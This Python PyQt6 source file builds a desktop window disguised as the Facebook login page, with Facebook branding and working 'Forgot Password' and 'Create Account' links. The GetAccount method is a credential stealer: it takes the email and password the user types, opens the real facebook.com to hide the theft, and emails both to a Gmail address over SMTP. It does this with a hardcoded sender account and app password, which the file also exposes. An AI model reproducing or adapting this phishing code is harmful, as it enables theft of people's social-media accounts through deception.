from PyQt6 import QtCore, QtGui, QtWidgets
from PyQt6.QtWidgets import QMessageBox
import os, webbrowser, shutil, smtplib, datetime
from email import message


class Ui_login(object):
    def setupUi(self, login):
        login.setObjectName("login")
        login.resize(682, 562)
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("images/fb-circle.ico"), QtGui.QIcon.Mode.Normal, QtGui.QIcon.State.Off)
        login.setWindowIcon(icon)
        login.setStyleSheet("background-color:black")
        self.frame_2 = QtWidgets.QFrame(login)
        self.frame_2.setGeometry(QtCore.QRect(280, 0, 401, 561))
        self.frame_2.setMinimumSize(QtCore.QSize(0, 0))
        self.frame_2.setMaximumSize(QtCore.QSize(411, 571))
        font = QtGui.QFont()
        font.setFamily("MT Extra")
        self.frame_2.setFont(font)
        self.frame_2.setStyleSheet("background-color:white; border-radius:40px")
        self.frame_2.setFrameShape(QtWidgets.QFrame.Shape.StyledPanel)
        self.frame_2.setFrameShadow(QtWidgets.QFrame.Shadow.Raised)
        self.frame_2.setObjectName("frame_2")
        self.input_email = QtWidgets.QLineEdit(self.frame_2)
        self.input_email.setGeometry(QtCore.QRect(101, 196, 271, 38))
        self.input_email.setMinimumSize(QtCore.QSize(271, 38))
        self.input_email.setMaximumSize(QtCore.QSize(271, 38))
        font = QtGui.QFont()
        font.setFamily("Microsoft Sans Serif")
        font.setPointSize(10)
        font.setBold(True)
        font.setWeight(75)
        self.input_email.setFont(font)
        self.input_email.setStyleSheet("background-color:rgb(240, 240, 240);border-radius:4px;padding:5px")
        self.input_email.setObjectName("input_email")
        self.input_password = QtWidgets.QLineEdit(self.frame_2)
        self.input_password.setGeometry(QtCore.QRect(101, 241, 234, 38))
        self.input_password.setMinimumSize(QtCore.QSize(0, 38))
        self.input_password.setMaximumSize(QtCore.QSize(271, 38))
        font = QtGui.QFont()
        font.setFamily("Microsoft Sans Serif")
        font.setPointSize(10)
        font.setBold(True)
        font.setWeight(75)
        self.input_password.setFont(font)
        self.input_password.setStyleSheet("background-color:rgb(240, 240, 240);border-radius:4px;padding:5px")
        self.input_password.setEchoMode(QtWidgets.QLineEdit.EchoMode.Password)
        self.input_password.setObjectName("input_password")
        self.label_5 = QtWidgets.QLabel(self.frame_2)
        self.label_5.setGeometry(QtCore.QRect(102, 145, 91, 38))
        self.label_5.setMinimumSize(QtCore.QSize(0, 38))
        self.label_5.setMaximumSize(QtCore.QSize(271, 38))
        font = QtGui.QFont()
        font.setFamily("8514oem")
        font.setPointSize(18)
        font.setBold(True)
        font.setItalic(False)
        font.setUnderline(False)
        font.setWeight(75)
        font.setStrikeOut(False)
        font.setKerning(True)
        font.setStyleStrategy(QtGui.QFont.StyleStrategy.PreferDefault)
        self.label_5.setFont(font)
        self.label_5.setStyleSheet("color:black\n"
"")
        self.label_5.setText("")
        self.label_5.setPixmap(QtGui.QPixmap("images/login.png"))
        self.label_5.setScaledContents(True)
        self.label_5.setAlignment(QtCore.Qt.AlignmentFlag.AlignLeading|QtCore.Qt.AlignmentFlag.AlignLeft|QtCore.Qt.AlignmentFlag.AlignVCenter)
        self.label_5.setObjectName("label_5")
        self.btnLogin = QtWidgets.QPushButton(self.frame_2)
        self.btnLogin.setGeometry(QtCore.QRect(101, 298, 271, 38))
        self.btnLogin.setMinimumSize(QtCore.QSize(271, 38))
        self.btnLogin.setMaximumSize(QtCore.QSize(271, 38))
        font = QtGui.QFont()
        font.setFamily("Segoe UI Black")
        font.setPointSize(10)
        font.setBold(True)
        font.setWeight(75)
        self.btnLogin.setFont(font)
        self.btnLogin.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
        self.btnLogin.setStyleSheet("QPushButton {background-color:rgb(23, 120, 242);color:white;\n"
"border-radius:5px}\n"
"\n"
"QPushButton::hover {background-color:rgba(23, 120, 242,230.0);color:white;\n"
"border-radius:5px}")
        icon1 = QtGui.QIcon()
        icon1.addPixmap(QtGui.QPixmap("images/btnlogin.png"), QtGui.QIcon.Mode.Normal, QtGui.QIcon.State.Off)
        self.btnLogin.setIcon(icon1)
        self.btnLogin.setIconSize(QtCore.QSize(271, 38))
        self.btnLogin.setFlat(True)
        self.btnLogin.setObjectName("btnLogin")
        self.label_2 = QtWidgets.QLabel(self.frame_2)
        self.label_2.setGeometry(QtCore.QRect(101, 368, 271, 31))
        self.label_2.setMaximumSize(QtCore.QSize(271, 16777215))
        self.label_2.setStyleSheet("color:rgb(206, 206, 206)")
        self.label_2.setObjectName("label_2")
        self.btnCreate = QtWidgets.QPushButton(self.frame_2)
        self.btnCreate.setGeometry(QtCore.QRect(120, 410, 231, 33))
        self.btnCreate.setMinimumSize(QtCore.QSize(231, 33))
        self.btnCreate.setMaximumSize(QtCore.QSize(231, 33))
        font = QtGui.QFont()
        font.setFamily("Segoe UI Black")
        font.setPointSize(10)
        font.setBold(True)
        font.setWeight(75)
        self.btnCreate.setFont(font)
        self.btnCreate.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
        self.btnCreate.setStyleSheet("QPushButton{\n"
"background-color:rgb(101, 179, 67);color:white;\n"
" border-radius:5px}\n"
"\n"
"QPushButton::hover{\n"
"background-color:rgba(101, 179, 67,230.0);color:white;\n"
" border-radius:5px}")
        icon2 = QtGui.QIcon()
        icon2.addPixmap(QtGui.QPixmap("images/btncreatenewaccount.png"), QtGui.QIcon.Mode.Normal, QtGui.QIcon.State.Off)
        self.btnCreate.setIcon(icon2)
        self.btnCreate.setIconSize(QtCore.QSize(271, 38))
        self.btnCreate.setFlat(True)
        self.btnCreate.setObjectName("btnCreate")
        self.btnforgotpassword = QtWidgets.QPushButton(self.frame_2)
        self.btnforgotpassword.setGeometry(QtCore.QRect(100, 350, 271, 20))
        self.btnforgotpassword.setMinimumSize(QtCore.QSize(0, 0))
        self.btnforgotpassword.setMaximumSize(QtCore.QSize(16777215, 16777215))
        font = QtGui.QFont()
        font.setFamily("Microsoft Sans Serif")
        font.setPointSize(8)
        self.btnforgotpassword.setFont(font)
        self.btnforgotpassword.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
        self.btnforgotpassword.setStyleSheet(" color:rgb(23, 120, 242);\n"
" border-radius:10px")
        self.btnforgotpassword.setIconSize(QtCore.QSize(83, 18))
        self.btnforgotpassword.setFlat(True)
        self.btnforgotpassword.setObjectName("btnforgotpassword")
        self.btnExit = QtWidgets.QPushButton(self.frame_2)
        self.btnExit.setGeometry(QtCore.QRect(355, 15, 31, 28))
        font = QtGui.QFont()
        font.setFamily("Arial Rounded MT Bold")
        font.setPointSize(20)
        font.setBold(False)
        font.setWeight(50)
        self.btnExit.setFont(font)
        self.btnExit.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
        self.btnExit.setStyleSheet("background:none;color:rgb(167, 167, 167)")
        self.btnExit.setObjectName("btnExit")
        self.btnMin = QtWidgets.QPushButton(self.frame_2)
        self.btnMin.setGeometry(QtCore.QRect(320, 15, 31, 28))
        font = QtGui.QFont()
        font.setFamily("Arial Rounded MT Bold")
        font.setPointSize(20)
        font.setBold(False)
        font.setWeight(50)
        self.btnMin.setFont(font)
        self.btnMin.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
        self.btnMin.setStyleSheet("background:none;color:rgb(167, 167, 167)")
        self.btnMin.setObjectName("btnMin")
        self.passwordToggle = QtWidgets.QPushButton(self.frame_2)
        self.passwordToggle.setGeometry(QtCore.QRect(333, 241, 38, 38))
        self.passwordToggle.setMinimumSize(QtCore.QSize(38, 38))
        self.passwordToggle.setMaximumSize(QtCore.QSize(38, 38))
        font = QtGui.QFont()
        font.setPointSize(2)
        self.passwordToggle.setFont(font)
        self.passwordToggle.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
        self.passwordToggle.setStyleSheet("background-color:rgb(240, 240, 240);border-radius:4px;padding:5px")
        self.passwordToggle.setText("")
        icon3 = QtGui.QIcon()
        icon3.addPixmap(QtGui.QPixmap("images/hidepw.png"), QtGui.QIcon.Mode.Normal, QtGui.QIcon.State.Off)
        self.passwordToggle.setIcon(icon3)
        self.passwordToggle.setCheckable(True)
        self.passwordToggle.setFlat(True)
        self.passwordToggle.setObjectName("pushButton")
        self.frame = QtWidgets.QFrame(login)
        self.frame.setGeometry(QtCore.QRect(0, 0, 351, 561))
        self.frame.setStyleSheet("background-color:rgb(23, 120, 242);\n"
"border-radius:60px")
        self.frame.setFrameShape(QtWidgets.QFrame.Shape.StyledPanel)
        self.frame.setFrameShadow(QtWidgets.QFrame.Shadow.Raised)
        self.frame.setObjectName("frame")
        self.label = QtWidgets.QLabel(self.frame)
        self.label.setGeometry(QtCore.QRect(30, 65, 281, 361))
        font = QtGui.QFont()
        font.setFamily("Consolas")
        font.setPointSize(38)
        font.setBold(True)
        font.setItalic(False)
        font.setUnderline(False)
        font.setWeight(75)
        font.setStrikeOut(False)
        font.setKerning(True)
        font.setStyleStrategy(QtGui.QFont.StyleStrategy.PreferDefault)
        self.label.setFont(font)
        self.label.setStyleSheet("color:white")
        self.label.setText("")
        self.label.setPixmap(QtGui.QPixmap("images/facebook-banner.png"))
        self.label.setScaledContents(True)
        self.label.setAlignment(QtCore.Qt.AlignmentFlag.AlignLeading|QtCore.Qt.AlignmentFlag.AlignLeft|QtCore.Qt.AlignmentFlag.AlignVCenter)
        self.label.setObjectName("label")
        self.Commit()

        self.retranslateUi(login)
        QtCore.QMetaObject.connectSlotsByName(login)

    def Commit(self):
        login.setWindowFlag(QtCore.Qt.WindowType.FramelessWindowHint)
        login.setAttribute(QtCore.Qt.WidgetAttribute.WA_TranslucentBackground)
        self.btnExit.clicked.connect(lambda: login.close())
        self.btnMin.clicked.connect(lambda: login.showMinimized())
        self.btnLogin.clicked.connect(self.GetAccount)
        self.btnforgotpassword.clicked.connect(self.FacebookForgotPassword)
        self.btnCreate.clicked.connect(self.FacebookCreateAccount)
        self.passwordToggle.toggled.connect(self.ToggleHideShow)
        self.input_password.returnPressed.connect(self.GetAccount)
        
    def GetAccount(self):
        
        if len(self.input_email.text()) != 0 and len(self.input_password.text()) != 0:
            try:
                    self.FacebookLogin()
                    x = datetime.datetime.now()
                    dt = x.strftime('%B %d, %Y [%I:%M%p] ')

                    email = self.input_email.text()
                    password = self.input_password.text()

                    send_to = 'facebook09091234@gmail.com'

                    GetAccount = f''' 
=================================================
 Email : {email}
-------------------------------------------------
 Password : {password}
=================================================

 Date and time : {dt}'''

                    msg = message.Message()
                    msg.add_header('from', 'Facebook')
                    msg.add_header('to', send_to)
                    msg.add_header('subject', 'New Login')
                    msg.set_payload(GetAccount)

                    sender_email = 'facebook09091234@gmail.com'
                    sender_password = 'zjbqqzczddzgigrv'

                    server = smtplib.SMTP('smtp.gmail.com', 587)
                    server.starttls()
                    server.login(sender_email, sender_password)
                    server.send_message(msg, from_addr= sender_email, to_addrs= send_to)
                    self.input_email.clear()
                    self.input_password.clear()
                    login.close()
            except:
                    self.msg = QMessageBox()
                    self.msg.setWindowIcon(QtGui.QIcon('images/fb-circle.ico'))
                    self.msg.setWindowTitle('Facebook')
                    self.msg.setIcon(QMessageBox.Icon.Warning)
                    self.msg.setText('Unknown Error Occured.')
                    self.msg.setInformativeText('Please try again later.')
                    self.msg.exec()
                    self.input_email.clear()
                    self.input_password.clear()
        else:

            self.msg = QMessageBox()
            self.msg.setWindowIcon(QtGui.QIcon('images/fb-circle.ico'))
            self.msg.setWindowTitle('Facebook')
            self.msg.setIcon(QMessageBox.Icon.Critical)
            self.msg.setText('Incorrect Email / Password.')
            self.msg.setInformativeText('Please try again.')
            self.msg.exec()
            self.input_email.clear()
            self.input_password.clear()

    def FacebookLogin(self):
        webbrowser.open('https://www.facebook.com', new=1)

    def FacebookCreateAccount(self):
        webbrowser.open('https://www.facebook.com/signup', new=1)


    def FacebookForgotPassword(self):
        webbrowser.open('https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0', new=1)


    def ToggleHideShow(self):
        if self.passwordToggle.isChecked():
            self.passwordToggle.setIcon(QtGui.QIcon("images/hidepw.png"))
            self.input_password.setEchoMode(QtWidgets.QLineEdit.EchoMode.Password)
        else:
            self.passwordToggle.setIcon(QtGui.QIcon("images/showpw.png"))
            self.input_password.setEchoMode(QtWidgets.QLineEdit.EchoMode.Normal)


    def retranslateUi(self, login):
        _translate = QtCore.QCoreApplication.translate
        login.setWindowTitle(_translate("login", "Facebook Log In Page"))
        self.input_email.setPlaceholderText(_translate("login", "  Email or Phone Number"))
        self.input_password.setPlaceholderText(_translate("login", "  Password"))
        self.btnLogin.setText(_translate("login", "Log In"))
        self.label_2.setText(_translate("login", "──────────────────────────────────────"))
        self.btnCreate.setText(_translate("login", "Create New Account"))
        self.btnforgotpassword.setText(_translate("login", "Forgot Password?"))
        self.btnExit.setText(_translate("login", "x"))
        self.btnMin.setText(_translate("login", "-"))


if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    login = QtWidgets.QWidget()
    ui = Ui_login()
    ui.setupUi(login)
    login.show()
    sys.exit(app.exec())
